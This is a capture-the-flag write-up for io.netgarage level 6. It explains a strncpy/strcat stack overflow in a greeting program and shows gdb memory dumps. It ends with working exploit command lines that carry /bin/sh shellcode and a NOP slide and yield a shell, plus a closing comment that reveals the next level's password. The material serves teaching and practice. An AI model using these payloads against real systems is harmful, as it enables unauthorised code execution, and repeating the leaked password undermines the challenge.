## Level 6:

Strange *ebp* and *esp* overflow effect.

```c
 1 //written by bla
 2 //inspired by nnp
 3 #include <stdio.h>
 4 #include <stdlib.h>
 5 #include <string.h>
 6 
 7 enum{
 8 LANG_ENGLISH,
 9 LANG_FRANCAIS,
10 LANG_DEUTSCH,
11 };
12 
13 int language = LANG_ENGLISH;
14 
15 struct UserRecord{
16     char name[40];
17     char password[32];
18     int id;
19 };
20 
21 void greetuser(struct UserRecord user){
22     char greeting[64];
23     switch(language){
24         case LANG_ENGLISH:
25             strcpy(greeting, "Hi "); break;
26         case LANG_FRANCAIS:
27             strcpy(greeting, "Bienvenue "); break;
28         case LANG_DEUTSCH:
29             strcpy(greeting, "Willkommen "); break;
30     }
31     strcat(greeting, user.name);
32     printf("%s\n", greeting);
33 }
34 
35 int main(int argc, char **argv, char **env){
36     if(argc != 3) {
37         printf("USAGE: %s [name] [password]\n", argv[0]);
38         return 1;
39     }
40 
41     struct UserRecord user = {0};
42     strncpy(user.name, argv[1], sizeof(user.name));
43     strncpy(user.password, argv[2], sizeof(user.password));
44 
45     char *envlang = getenv("LANG");
46     if(envlang)
47         if(!memcmp(envlang, "fr", 2))
48             language = LANG_FRANCAIS;
49         else if(!memcmp(envlang, "de", 2))
50             language = LANG_DEUTSCH;
51 
52     greetuser(user);
53 }
```

strncpy doesn't protect against a overflow because it doesn't require a NUL termination more [here](https://devblogs.microsoft.com/oldnewthing/20050107-00/?p=36773).

The strncpy is one part of the puzzle. Currently if we try to store name larger or equel to 40 bytes we will save the 40 characters without the NUL byte and the same can be done with the password. This alone causes SIGSEGV but it isn't too helpful.

There is another "unsafe" function: strcat. We are concatinating first the greeting ("Hi ", ...) into the greeting variable and then the name. However since the name doesn't have NUL byte it will actually concatinate the password as well and this will cause an overflow. We are trying to fit 72 bytes (name + password) + greeting into a 64 byte reserved space. We can clearly see this in action if we just try to run the program with the max name and password.

```console
(gdb) r $(python -c 'print "A"*40 + " " + "B"*32')
Starting program: /levels/level06 $(python -c 'print "A"*40 + " " + "B"*32')
Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

We see both of them get printed out. Now we can set a few breakpoints to look at the buffer in crucial points in the program.

```console
(gdb) disass main
Dump of assembler code for function main:
...
0x080486a8 <+277>:	rep movsl %ds:(%esi),%es:(%edi)
0x080486aa <+279>:	call   0x804851c <greetuser>
0x080486af <+284>:	lea    -0xc(%ebp),%esp
...
(gdb) disass greetuser
Dump of assembler code for function greetuser:
...
0x0804857e <+98>:	mov    %eax,(%esp)
0x08048581 <+101>:	call   0x80483d0 <strcat@plt>
0x08048586 <+106>:	lea    -0x48(%ebp),%eax
0x08048589 <+109>:	mov    %eax,(%esp)
0x0804858c <+112>:	call   0x80483f0 <puts@plt>
0x08048591 <+117>:	leave  
0x08048592 <+118>:	ret
(gdb) b *0x08048581
Breakpoint 1 at 0x8048581
(gdb) b *0x08048591
Breakpoint 2 at 0x8048591
```

We set the breakpoints before and after the strcat function to see what exactly happens (i.e. addresses: 0x08048581 and 0x08048591).

```console
(gdb) r $(python -c 'print "A"*40 + " " + "B"*32')
Starting program: /levels/level06 $(python -c 'print "A"*40 + " " + "B"*32')

Breakpoint 1, 0x08048581 in greetuser ()
(gdb) x/52xw $esp
0xbffffb00:	0xbffffb10	0xbffffb60	0x07b1ea71	0xbffffb30
0xbffffb10:	0x6e656942	0x756e6576	0x00002065	0xb7e3bff0
0xbffffb20:	0xbfffff6b	0xb7e15b58	0x00000002	0xb7fffc10
0xbffffb30:	0xb7fe9eeb	0xbffffbb0	0x00000003	0xbffffbfc
0xbffffb40:	0xbffffc18	0xb7ff05f0	0xbfffff6b	0xb7e85360
0xbffffb50:	0xb7e85397	0x00000003	0xbffffc18	0x080486af
0xbffffb60:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb80:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffba0:	0x42424242	0x42424242	0x00000000	0x080482da
0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) x/s 0xbffffb60
0xbffffb60:	'A' <repeats 40 times>, 'B' <repeats 32 times>
(gdb) c
Continuing.
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x08048591 in greetuser ()
(gdb) x/52xw $esp
0xbffffb00:	0xbffffb10	0xbffffb60	0x07b1ea71	0xbffffb30
0xbffffb10:	0x41206948	0x41414141	0x41414141	0x41414141
0xbffffb20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb30:	0x41414141	0x41414141	0x42414141	0x42424242
0xbffffb40:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffb50:	0x42424242	0x42424242	0x00424242	0x080486af
0xbffffb60:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb80:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffba0:	0x42424242	0x42424242	0x00000000	0x080482da
0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
```
We can see the A's and B's as well as the return address 0x080486af. We are not overwriting it right now, it seems the buffer is too small to reach it. Thankfully we can add few more bytes by changing the LANG variable, I chose fr for french.

```console
(gdb) set environment LANG=fr
(gdb) r $(python -c 'print "A"*40 + " " + "B"*32')
Starting program: /levels/level06 $(python -c 'print "A"*40 + " " + "B"*32')

Breakpoint 1, 0x08048581 in greetuser ()
(gdb) c
Continuing.
Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x08048591 in greetuser ()
(gdb) x/52xw $esp
0xbffffb00:	0xbffffb10	0xbffffb60	0x07b1ea71	0xbffffb30
0xbffffb10:	0x6e656942	0x756e6576	0x41412065	0x41414141
0xbffffb20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb40:	0x42424141	0x42424242	0x42424242	0x42424242
0xbffffb50:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffb60:	0x41004242	0x41414141	0x41414141	0x41414141
0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb80:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffba0:	0x42424242	0x42424242	0x00000000	0x080482da
0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
```

Now we overwrote the return address!



We can also see after the 40 bytes of A's the remaining size is 26 before we overwrote the return address, so we need to add 26 random bytes (I chose "B" or \x42) and then append the starting address of the shellcode (in my case: 0xbffffb1a).

So our total payload looks like this:
```console
(gdb) r $(python -c 'print "A"*6 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*11 + " " + "B"*26 + "\x1a\xfb\xff\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level06 $(python -c 'print "A"*6 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*11 + " " + "B"*26 + "\x1a\xfb\xff\xbf"')

Breakpoint 4, 0x08048581 in greetuser ()
(gdb) c
Continuing.
Bienvenue AAAAAA1�Ph//shh/bin��PS��
                                   AAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB����

Breakpoint 5, 0x08048591 in greetuser ()
(gdb) c
Continuing.
process 3917 is executing new program: /bin/bash
sh-4.3$
```

After continuing throught our breakpoints we get the shell. I've also added a NOP slide (\x90 bytes) to help if the address was slightly off (this helps me in the future). If we however try this outside the gdb we get an error.


```console
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + " " + "B"*26 + "\x1a\xfb\xff\xbf"')
Bienvenue �����������������1�Ph//shh/bin��PS��
                                              BBBBBBBBBBBBBBBBBBBBBBBBBB����
Illegal instruction
level6@io:/levels$ 
```

This is because the address while using the gdb was probably slightly different. There is a way to use the absolut address, for this solution you can go [here](https://github.com/randomcompanyname/ctf_writeup/blob/master/io.netgarage.org/level6.md). 

What I tried is changing the least significant byte by a factor of 16 (i.e. \x00 -> \x10 -> \x20 ...) to find the address. Since I'm using the NOP slide I need just the approximate location to the payload to execute it and it turns out to be 0xbffffb40:

```console
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + " " + "B"*26 + "\x40\xfb\xff\xbf"')
Bienvenue �����������������1�Ph//shh/bin��PS��
                                              BBBBBBBBBBBBBBBBBBBBBBBBBB@���
sh-4.3$ 
```

<!-- Level 7 password ==> U3A6ZtaTub14VmwV -->